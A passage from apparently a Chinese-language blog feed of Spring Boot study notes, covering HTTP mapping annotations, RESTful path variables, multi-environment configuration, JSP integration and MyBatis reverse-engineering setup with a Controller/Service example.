<h2 id="1-4-DeleteMapping删"><a href="#1-4-DeleteMapping删" class="headerlink" title="1.4 @DeleteMapping删"></a>1.4 @DeleteMapping删</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@DeleteMapping(value = &quot;/delete&quot;)</span></span><br><span class="line"><span class="comment">//    删除数据时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;delete Student&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="1-5-PutMapping改"><a href="#1-5-PutMapping改" class="headerlink" title="1.5 @PutMapping改"></a>1.5 @PutMapping改</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//    @RequestMapping(value = &quot;/update&quot;,method = RequestMethod.PUT)</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;/update&quot;)</span></span><br><span class="line"><span class="comment">//    更改数据时候使用</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">update</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;update student info&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2-RESTful风格"><a href="#2-RESTful风格" class="headerlink" title="2.RESTful风格"></a>2.RESTful风格</h1><p>localhost:8080/sutdent?id=1001&amp;age=23</p>
<p>可以优化为</p>
<p>localhost:8080/sutdent?/1001/23</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;age&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student1</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="meta">@PathVariable(&quot;age&quot;)</span> Integer age)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>, id);</span><br><span class="line">        retMap.put(<span class="string">&quot;age&quot;</span>, age);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/student/detail/&#123;id&#125;/&#123;status&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">student2</span><span class="params">(<span class="meta">@PathVariable(&quot;id&quot;)</span> Integer id,</span></span></span><br><span class="line"><span class="function"><span class="params">                           <span class="meta">@PathVariable(&quot;status&quot;)</span> Integer status)</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        retMap.put(<span class="string">&quot;id&quot;</span>, id);</span><br><span class="line">        retMap.put(<span class="string">&quot;status&quot;</span>, status);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<font color="ff0000">以上代码studen1和studen2出现请求模糊</font>

<p>使用时候需要注意增删改查的请求方式进行区分&lt;/font&gt;</p>
<ul>
<li><p>student1需要加@GetMapping、student2需要加@DeleteMapping</p>
</li>
<li><p>修改请求路径顺序</p>
</li>
</ul>
]]></content>
      <categories>
        <category>SpringBoot学习</category>
      </categories>
      <tags>
        <tag>SpringBoot学习</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringBoot-逆向工程</title>
    <url>/post/1511e846.html</url>
    <content><![CDATA[<p>　　之前建立实体类，需要手动慢慢建立，很没有效率，了解了逆向工程之后，确实很方便<span id="more"></span></p>
<h1 id="1-返回json数据"><a href="#1-返回json数据" class="headerlink" title="1.返回json数据"></a>1.返回json数据</h1><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.gyl.springboot.web;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/say&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Object <span class="title">m</span><span class="params">(String message)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Say:Hello&quot;</span> + message;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@RequestMapping(value = &quot;/mapvalue&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Map&lt;String, Object&gt; <span class="title">mapvalue</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Map&lt;String, Object&gt; retMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line">        retMap.put(<span class="string">&quot;message&quot;</span>, <span class="string">&quot;hello SpringBoot&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> retMap;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在浏览器中url后面加上<code>?message=World</code></p>
<p>就会显示Say:HelloWorld</p>
<p>访问localhost:8080/mapvalue可以显示</p>
<p>message:hello SpringBoot</p>
<h1 id="2-核心配置文件"><a href="#2-核心配置文件" class="headerlink" title="2.核心配置文件"></a>2.核心配置文件</h1><h2 id="2-1-三类配置文件比较"><a href="#2-1-三类配置文件比较" class="headerlink" title="2.1 三类配置文件比较"></a>2.1 三类配置文件比较</h2><p>properties</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br></pre></td></tr></table></figure>
<p>yml和yaml格式一样，只是名字不一样</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span></span><br><span class="line">  <span class="attr">servlet:</span></span><br><span class="line">    <span class="attr">context-path:</span> <span class="string">/</span></span><br></pre></td></tr></table></figure>
<p>当yml/properties文件同时存在时，以properties文件为准</p>
<h1 id="3-多环境下核心配置文件"><a href="#3-多环境下核心配置文件" class="headerlink" title="3.多环境下核心配置文件"></a>3.多环境下核心配置文件</h1><p>开发环境—&gt;测试环境—&gt;准生产环境—&gt;生产环境</p>
<p>yml和properties一样，只是后缀不一样</p>
<p>主核心配置文件</p>
<p><code>application.properties</code></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">spring.profiles.active</span>=<span class="string">dev</span></span><br></pre></td></tr></table></figure>
<p>多配置文件要以application-开头</p>
<p><code>application-dev.properties</code>开发环境</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/dev</span></span><br></pre></td></tr></table></figure>
<p><code>application-test.properties</code>测试环境</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/test</span></span><br></pre></td></tr></table></figure>
<p><code>application-ready.properties</code>准生产环境</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/ready</span></span><br></pre></td></tr></table></figure>
<p><code>application-product.properties</code>生产环境</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">server.port</span>=<span class="string">9090</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/product</span></span><br></pre></td></tr></table></figure>
<h1 id="4-集成jsp"><a href="#4-集成jsp" class="headerlink" title="4.集成jsp"></a>4.集成jsp</h1><p>首先，创建webapp资源文件夹，并设置该文件夹为web项目文件夹。</p>
<p>之后，在pom.xml中引入SpringBoot内嵌tomcat对jsp的解依赖</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.embed<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat-embed-jasper<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后，在pom.xml下指定编译路径在\<build>\</build>中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--源文件夹--&gt;</span></span><br><span class="line">    	<span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/webapp<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指定编译到META-INF/resources--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>META-INF/resources<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--指定源文件夹中的哪个资源要编译进行--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">        	<span class="tag">&lt;<span class="name">include</span>&gt;</span>*.*<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>最后，在application.properties中配置视图解析器</p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="meta">spring.mvc.view.prefix</span>=<span class="string">/</span></span><br><span class="line"><span class="meta">spring.mvc.view.suffix</span>=<span class="string">.jsp</span></span><br></pre></td></tr></table></figure>
<h1 id="5-集成MyBatis依赖"><a href="#5-集成MyBatis依赖" class="headerlink" title="5.集成MyBatis依赖"></a>5.集成MyBatis依赖</h1><p>导入MaBatis依赖支持</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--MySQL驱动--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--MyBatis整合SpringBoot框架的起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>RELEASE<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="5-1-MyBatis逆向工程"><a href="#5-1-MyBatis逆向工程" class="headerlink" title="5.1 MyBatis逆向工程"></a>5.1 MyBatis逆向工程</h2><p><strong>1.GeneratorMapper.xml</strong></p>
<p>在根目录下创建GeneratorMapper.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">generatorConfiguration</span></span></span><br><span class="line"><span class="meta">        <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//mybatis.org//DTD MyBatis Generator Configuration 1.0//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="meta-string">&quot;http://mybatis.org/dtd/mybatis-generator-config_1_0.dtd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">generatorConfiguration</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--指定连接数据库的JDBC 驱动包所在位置，指定到你本机的完整路径--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">classPathEntry</span></span></span><br><span class="line"><span class="tag">            <span class="attr">location</span>=<span class="string">&quot;D:\JavaTools\Maven\Mavenrespository\mysql\mysql-connector-java\8.0.22\mysql-connector-java-8.0.22.jar&quot;</span>/&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--配置table表信息内容体，targetRuntime 指定采用MyBatis3的版本--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context</span> <span class="attr">id</span>=<span class="string">&quot;testTables&quot;</span> <span class="attr">targetRuntime</span>=<span class="string">&quot;MyBatis3&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--抑制生成注释，由于生成的注释都是英文的，可以不让它生成--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suppressAllComments&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">commentGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--配置数据库连接信息--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdbcConnection</span> <span class="attr">driverClass</span>=<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">connectionURL</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/springboot_student?useUnicode=true<span class="symbol">&amp;amp;</span>characterEncoding=utf-8<span class="symbol">&amp;amp;</span>useSSL=false<span class="symbol">&amp;amp;</span>serverTimezone=GMT%2B8&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">userId</span>=<span class="string">&quot;root&quot;</span></span></span><br><span class="line"><span class="tag">                        <span class="attr">password</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;nullCatalogMeansCurrent&quot;</span> <span class="attr">value</span>=<span class="string">&quot;true&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdbcConnection</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--生成model 类，targetPackage 指定 model 类的包名，targetProject 指定</span></span><br><span class="line"><span class="comment">        生成的 model放在eclipse的哪个工程下面--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaModelGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.model&quot;</span></span></span><br><span class="line"><span class="tag">                            <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;trimStrings&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaModelGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--生成 MyBatis的Mapper.xml文件，targetPackage 指定 mapper.xml文件的包名，targetProject 指定生成的 mapper.xml放在 eclipse的哪个工程下面</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sqlMapGenerator</span> <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                         <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">sqlMapGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--生成 MyBatis的 Mapper接口类文件,targetPackage 指定 Mapper 接口类的包名，targetProject 指定生成的 Mapper 接口放在eclipse 的哪个工程下面</span></span><br><span class="line"><span class="comment">        --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">javaClientGenerator</span> <span class="attr">type</span>=<span class="string">&quot;XMLMAPPER&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetPackage</span>=<span class="string">&quot;com.springboot.mapper&quot;</span></span></span><br><span class="line"><span class="tag">                             <span class="attr">targetProject</span>=<span class="string">&quot;src/main/java&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;enableSubPackages&quot;</span> <span class="attr">value</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">javaClientGenerator</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--数据库表名及对应的Java模型类名，数据库有多少张表就配置几个table--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">tableName</span>=<span class="string">&quot;t_student&quot;</span> <span class="attr">domainObjectName</span>=<span class="string">&quot;Student&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableCountByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableUpdateByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableDeleteByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">enableSelectByExample</span>=<span class="string">&quot;false&quot;</span></span></span><br><span class="line"><span class="tag">               <span class="attr">selectByExampleQueryId</span>=<span class="string">&quot;false&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">generatorConfiguration</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>2.在pom.xml文件中导入MyBatis-generator插件</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="comment">&lt;!--MyBatis整合SpringBoot框架的起步依赖--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.4<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">    	<span class="comment">&lt;!--配置文件的位置--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configurationFile</span>&gt;</span>GeneratorMapper.xml<span class="tag">&lt;/<span class="name">configurationFile</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://s3.ax1x.com/2021/03/15/6BsMTg.png" alt="6BsMTg.png"></p>
<p>然后查看生成的StudentMapper.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">id</span>=<span class="string">&quot;BaseResultMap&quot;</span> <span class="attr">type</span>=<span class="string">&quot;com.springboot.model.Student&quot;</span>&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--id标签只能修改主键字段--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--result除了主键以外的字段--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	column数据库中的字段名称	</span></span><br><span class="line"><span class="comment">		property映射对象的属性名称</span></span><br><span class="line"><span class="comment">	jdbcType列中数据库中字段的类型（可以省略不写）</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	resultMap作用</span></span><br><span class="line"><span class="comment">	1.当数据库中字段名称与实体对象的属性名不一致时，可以进行转换</span></span><br><span class="line"><span class="comment">	2.当前查询的结果没有对象一个表的时候，可以自定义一个结果集		</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">     <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">	数据库字段名称		实体对象属性名称</span></span><br><span class="line"><span class="comment">	user_name		userName</span></span><br><span class="line"><span class="comment">	product_type	productType</span></span><br><span class="line"><span class="comment">	--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">id</span> <span class="attr">column</span>=<span class="string">&quot;id&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;id&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;name&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;VARCHAR&quot;</span> <span class="attr">property</span>=<span class="string">&quot;name&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">result</span> <span class="attr">column</span>=<span class="string">&quot;age&quot;</span> <span class="attr">jdbcType</span>=<span class="string">&quot;INTEGER&quot;</span> <span class="attr">property</span>=<span class="string">&quot;age&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--抽取公共部分，方便下面include引用--&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">sql</span> <span class="attr">id</span>=<span class="string">&quot;Base_Column_List&quot;</span>&gt;</span></span><br><span class="line">   id, name, age</span><br><span class="line"> <span class="tag">&lt;/<span class="name">sql</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>3.指定资源文件夹</strong></p>
<p>在pom.xml文件中的build下添加，扫描StudentMapper.xml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--        手动指定文件夹为resources--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">directory</span>&gt;</span>src/main/java<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">includes</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">include</span>&gt;</span>**/*.xml<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">includes</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>4.配置application.properties文件</strong></p>
<figure class="highlight properties"><table><tr><td class="code"><pre><span class="line"><span class="comment">#配置内嵌Tomcat端口号</span></span><br><span class="line"><span class="meta">server.port</span>=<span class="string">9090 </span></span><br><span class="line"><span class="comment">#配置项目上下文根</span></span><br><span class="line"><span class="meta">server.servlet.context-path</span>=<span class="string">/</span></span><br><span class="line"><span class="comment">#配置数据库的连接信息</span></span><br><span class="line"><span class="comment"># 注意这里的驱动类有变化</span></span><br><span class="line"><span class="meta">spring.datasource.driver-class-name</span>=<span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line"><span class="meta">spring.datasource.url</span>=<span class="string">jdbc:mysql://localhost:3306/springboot_student?useUnicode=true&amp;characterEncoding=utf-8&amp;useSSL=false&amp;serverTimezone=GMT%2B8</span></span><br><span class="line"><span class="meta">spring.datasource.username</span>=<span class="string">root</span></span><br><span class="line"><span class="meta">spring.datasource.password</span>=<span class="string">root</span></span><br></pre></td></tr></table></figure>
<h2 id="5-2-业务逻辑"><a href="#5-2-业务逻辑" class="headerlink" title="5.2 业务逻辑"></a>5.2 业务逻辑</h2><p>Controller—&gt;Service—&gt;ServiceImpl</p>
<p>先Controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentController</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentService studentService;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@RequestMapping(value = &quot;/student&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> <span class="meta">@ResponseBody</span> <span class="function">Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="comment">//调用业务层方法</span></span><br><span class="line">        Student student = studentService.queryStudentById(id);</span><br><span class="line">		<span class="keyword">return</span> student;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后写Service层</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">StudentService</span> </span>&#123;</span><br><span class="line">    <span class="comment">//根据学生id查询详情</span></span><br><span class="line">    <span class="function">Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>再写ServiceImpl类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">StudentServiceImpl</span> <span class="keyword">implements</span> <span class="title">StudentService</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> StudentMapper studentMapper;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Student <span class="title">queryStudentById</span><span class="params">(Integer id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> studentMapper.selectByPrimaryKey(id);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在入口类上写上@MapperScan(basePackages = “”)注解</p>
<h2 id="5-3-MyBatis映射文件方法有两种"><a href="#5-3-MyBatis映射文件方法有两种" class="headerlink" title="5.3 MyBatis映射文件方法有两种"></a>5.3 MyBatis映射文件方法有两种</h2><ul>
<li>第一种</li>
</ul>
<p>当接口类和xml文件在一块时，在pom.xml中的build标签中添加</p>
